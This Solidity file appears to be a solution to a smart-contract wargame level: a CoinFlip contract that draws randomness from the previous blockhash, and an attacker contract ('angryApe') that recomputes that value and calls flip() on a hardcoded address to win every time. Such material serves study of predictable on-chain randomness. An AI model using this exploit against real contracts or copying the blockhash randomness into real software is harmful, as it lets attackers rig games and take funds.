// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
using SafeMath for uint256;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
      consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));


      if (lastHash == blockValue) {
        revert();
      }
      lastHash = blockValue;
      
      uint256 coinFlip = blockValue.div(FACTOR);
      bool side = coinFlip == 1 ? true : false;

      if (side == _guess) {
        consecutiveWins++;
        return true;
      } else {
        consecutiveWins = 0;
        return false;
      }
    }
}


contract angryApe {
  CoinFlip public flipper; // instance of target contract
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  bool public guess; // make guess accesible

  // init connection to the target contract
  constructor() {
    flipper = CoinFlip(0x37b29A2b9d16b4d005EfcEce415e555C5FD2cf71);
  }

  // cheat()
  function cheat() public returns(bool) {
    // calculate blockValue, flip & get your guss
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 flip       = blockValue.div(FACTOR);
    guess   = flip == 1 ? true : false;

    // send to target contract
    flipper.flip(guess);
    return true;
  }
}
